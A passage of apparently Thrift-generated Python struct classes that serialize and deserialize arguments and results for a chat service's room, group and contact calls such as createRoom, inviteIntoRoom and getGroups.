            oprot.writeFieldBegin('groupId', TType.STRING, 2)
            oprot.writeString(self.groupId.encode('utf-8') if sys.version_info[0] == 2 else self.groupId)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class leaveGroup_result(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, e=None,):
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('leaveGroup_result')
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getRoom_args(object):

    thrift_spec = (
        None,  # 0
        None,  # 1
        (2, TType.STRING, 'roomId', 'UTF8', None, ),  # 2
    )

    def __init__(self, roomId=None,):
        self.roomId = roomId

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 2:
                if ftype == TType.STRING:
                    self.roomId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('getRoom_args')
        if self.roomId is not None:
            oprot.writeFieldBegin('roomId', TType.STRING, 2)
            oprot.writeString(self.roomId.encode('utf-8') if sys.version_info[0] == 2 else self.roomId)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getRoom_result(object):

    thrift_spec = (
        (0, TType.STRUCT, 'success', (Room, Room.thrift_spec), None, ),  # 0
        (1, TType.STRUCT, 'e', (TalkException, TalkException.thrift_spec), None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.STRUCT:
                    self.success = Room()
                    self.success.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('getRoom_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.STRUCT, 0)
            self.success.write(oprot)
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getCompactRoom_args(object):

    thrift_spec = (
        None,  # 0
        None,  # 1
        (2, TType.STRING, 'roomId', 'UTF8', None, ),  # 2
    )

    def __init__(self, roomId=None,):
        self.roomId = roomId

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 2:
                if ftype == TType.STRING:
                    self.roomId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('getCompactRoom_args')
        if self.roomId is not None:
            oprot.writeFieldBegin('roomId', TType.STRING, 2)
            oprot.writeString(self.roomId.encode('utf-8') if sys.version_info[0] == 2 else self.roomId)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getCompactRoom_result(object):

    thrift_spec = (
        (0, TType.STRUCT, 'success', (Room, Room.thrift_spec), None, ),  # 0
        (1, TType.STRUCT, 'e', (TalkException, TalkException.thrift_spec), None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.STRUCT:
                    self.success = Room()
                    self.success.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('getCompactRoom_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.STRUCT, 0)
            self.success.write(oprot)
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class inviteIntoRoom_args(object):

    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'reqSeq', None, None, ),  # 1
        (2, TType.STRING, 'roomId', 'UTF8', None, ),  # 2
        (3, TType.LIST, 'contactIds', (TType.STRING, 'UTF8', False), None, ),  # 3
    )

    def __init__(self, reqSeq=None, roomId=None, contactIds=None,):
        self.reqSeq = reqSeq
        self.roomId = roomId
        self.contactIds = contactIds

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.reqSeq = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.roomId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.LIST:
                    self.contactIds = []
                    (_etype1153, _size1150) = iprot.readListBegin()
                    for _i1154 in range(_size1150):
                        _elem1155 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                        self.contactIds.append(_elem1155)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('inviteIntoRoom_args')
        if self.reqSeq is not None:
            oprot.writeFieldBegin('reqSeq', TType.I32, 1)
            oprot.writeI32(self.reqSeq)
            oprot.writeFieldEnd()
        if self.roomId is not None:
            oprot.writeFieldBegin('roomId', TType.STRING, 2)
            oprot.writeString(self.roomId.encode('utf-8') if sys.version_info[0] == 2 else self.roomId)
            oprot.writeFieldEnd()
        if self.contactIds is not None:
            oprot.writeFieldBegin('contactIds', TType.LIST, 3)
            oprot.writeListBegin(TType.STRING, len(self.contactIds))
            for iter1156 in self.contactIds:
                oprot.writeString(iter1156.encode('utf-8') if sys.version_info[0] == 2 else iter1156)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class inviteIntoRoom_result(object):

    thrift_spec = (
        None,  # 0
        (1, TType.STRUCT, 'e', (TalkException, TalkException.thrift_spec), None, ),  # 1
    )

    def __init__(self, e=None,):
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('inviteIntoRoom_result')
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class createRoom_args(object):

    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'reqSeq', None, None, ),  # 1
        (2, TType.LIST, 'contactIds', (TType.STRING, 'UTF8', False), None, ),  # 2
    )

    def __init__(self, reqSeq=None, contactIds=None,):
        self.reqSeq = reqSeq
        self.contactIds = contactIds

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.reqSeq = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.LIST:
                    self.contactIds = []
                    (_etype840, _size837) = iprot.readListBegin()
                    for _i841 in range(_size837):
                        _elem842 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                        self.contactIds.append(_elem842)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('createRoom_args')
        if self.reqSeq is not None:
            oprot.writeFieldBegin('reqSeq', TType.I32, 1)
            oprot.writeI32(self.reqSeq)
            oprot.writeFieldEnd()
        if self.contactIds is not None:
            oprot.writeFieldBegin('contactIds', TType.LIST, 2)
            oprot.writeListBegin(TType.STRING, len(self.contactIds))
            for iter843 in self.contactIds:
                oprot.writeString(iter843.encode('utf-8') if sys.version_info[0] == 2 else iter843)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class createRoom_result(object):

    thrift_spec = (
        (0, TType.STRUCT, 'success', (Room, Room.thrift_spec), None, ),  # 0
        (1, TType.STRUCT, 'e', (TalkException, TalkException.thrift_spec), None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.STRUCT:
                    self.success = Room()
                    self.success.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('createRoom_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.STRUCT, 0)
            self.success.write(oprot)
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class leaveRoom_args(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'reqSeq', None, None, ),  # 1
        (2, TType.STRING, 'roomId', 'UTF8', None, ),  # 2
    )

    def __init__(self, reqSeq=None, roomId=None,):
        self.reqSeq = reqSeq
        self.roomId = roomId

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.reqSeq = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.roomId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('leaveRoom_args')
        if self.reqSeq is not None:
            oprot.writeFieldBegin('reqSeq', TType.I32, 1)
            oprot.writeI32(self.reqSeq)
            oprot.writeFieldEnd()
        if self.roomId is not None:
            oprot.writeFieldBegin('roomId', TType.STRING, 2)
            oprot.writeString(self.roomId.encode('utf-8') if sys.version_info[0] == 2 else self.roomId)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class leaveRoom_result(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )
    
    def __init__(self, e=None,):
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('leaveRoom_result')
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getContact_args(object):
    
    thrift_spec = (
        None,  # 0
        None,  # 1
        (2, TType.STRING, 'id', 'UTF8', None, ),  # 2
    )

    def __init__(self, id=None,):
        self.id = id

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 2:
                if ftype == TType.STRING:
                    self.id = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getContact_args')
        if self.id is not None:
            oprot.writeFieldBegin('id', TType.STRING, 2)
            oprot.writeString(self.id.encode('utf-8') if sys.version_info[0] == 2 else self.id)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getContact_result(object):
    
    thrift_spec = (
        (0, TType.STRUCT, 'success', [Contact, None], None, ),  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.STRUCT:
                    self.success = Contact()
                    self.success.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getContact_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.STRUCT, 0)
            self.success.write(oprot)
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getContacts_args(object):

    thrift_spec = (
        None,  # 0
        None,  # 1
        (2, TType.LIST, 'ids', (TType.STRING, 'UTF8', False), None, ),  # 2
    )

    def __init__(self, ids=None,):
        self.ids = ids

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 2:
                if ftype == TType.LIST:
                    self.ids = []
                    (_etype1013, _size1010) = iprot.readListBegin()
                    for _i1014 in range(_size1010):
                        _elem1015 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                        self.ids.append(_elem1015)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('getContacts_args')
        if self.ids is not None:
            oprot.writeFieldBegin('ids', TType.LIST, 2)
            oprot.writeListBegin(TType.STRING, len(self.ids))
            for iter1016 in self.ids:
                oprot.writeString(iter1016.encode('utf-8') if sys.version_info[0] == 2 else iter1016)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getContacts_result(object):
    """
    Attributes:
     - success
     - e
    """

    thrift_spec = (
        (0, TType.LIST, 'success', (TType.STRUCT, (Contact, Contact.thrift_spec), False), None, ),  # 0
        (1, TType.STRUCT, 'e', (TalkException, TalkException.thrift_spec), None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.LIST:
                    self.success = []
                    (_etype1020, _size1017) = iprot.readListBegin()
                    for _i1021 in range(_size1017):
                        _elem1022 = Contact()
                        _elem1022.read(iprot)
                        self.success.append(_elem1022)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('getContacts_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.LIST, 0)
            oprot.writeListBegin(TType.STRUCT, len(self.success))
            for iter1023 in self.success:
                iter1023.write(oprot)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getGroupWithoutMembers_args(object):
    
    thrift_spec = (
        None,  # 0
        None,  # 1
        (2, TType.STRING, 'groupId', 'UTF8', None, ),  # 2
    )

    def __init__(self, groupId=None,):
        self.groupId = groupId

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 2:
                if ftype == TType.STRING:
                    self.groupId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getGroupWithoutMembers_args')
        if self.groupId is not None:
            oprot.writeFieldBegin('groupId', TType.STRING, 2)
            oprot.writeString(self.groupId.encode('utf-8') if sys.version_info[0] == 2 else self.groupId)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getGroupWithoutMembers_result(object):
    
    thrift_spec = (
        (0, TType.STRUCT, 'success', [Group, None], None, ),  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.STRUCT:
                    self.success = Group()
                    self.success.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getGroupWithoutMembers_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.STRUCT, 0)
            self.success.write(oprot)
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getGroup_args(object):
    
    thrift_spec = (
        None,  # 0
        None,  # 1
        (2, TType.STRING, 'groupId', 'UTF8', None, ),  # 2
    )

    def __init__(self, groupId=None,):
        self.groupId = groupId

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 2:
                if ftype == TType.STRING:
                    self.groupId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getGroup_args')
        if self.groupId is not None:
            oprot.writeFieldBegin('groupId', TType.STRING, 2)
            oprot.writeString(self.groupId.encode('utf-8') if sys.version_info[0] == 2 else self.groupId)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getGroup_result(object):
    
    thrift_spec = (
        (0, TType.STRUCT, 'success', [Group, None], None, ),  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.STRUCT:
                    self.success = Group()
                    self.success.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getGroup_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.STRUCT, 0)
            self.success.write(oprot)
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getGroups_args(object):

    thrift_spec = (
        None,  # 0
        None,  # 1
        (2, TType.LIST, 'groupIds', (TType.STRING, 'UTF8', False), None, ),  # 2
    )

    def __init__(self, groupIds=None,):
        self.groupIds = groupIds

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 2:
                if ftype == TType.LIST:
                    self.groupIds = []
                    (_etype1048, _size1045) = iprot.readListBegin()
                    for _i1049 in range(_size1045):
                        _elem1050 = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                        self.groupIds.append(_elem1050)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('getGroups_args')
        if self.groupIds is not None:
            oprot.writeFieldBegin('groupIds', TType.LIST, 2)
            oprot.writeListBegin(TType.STRING, len(self.groupIds))
            for iter1051 in self.groupIds:
                oprot.writeString(iter1051.encode('utf-8') if sys.version_info[0] == 2 else iter1051)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()
   
class getGroups_result(object):
  
    thrift_spec = (
        (0, TType.LIST, 'success', (TType.STRUCT, (Group, Group.thrift_spec), False), None, ),  # 0
        (1, TType.STRUCT, 'e', (TalkException, TalkException.thrift_spec), None, ),  # 1
    )
    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.LIST:
                    self.success = []
                    (_etype1055, _size1052) = iprot.readListBegin()
                    for _i1056 in range(_size1052):
                        _elem1057 = Group()
                        _elem1057.read(iprot)
                        self.success.append(_elem1057)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('getGroups_result')
        if self.success is not None:
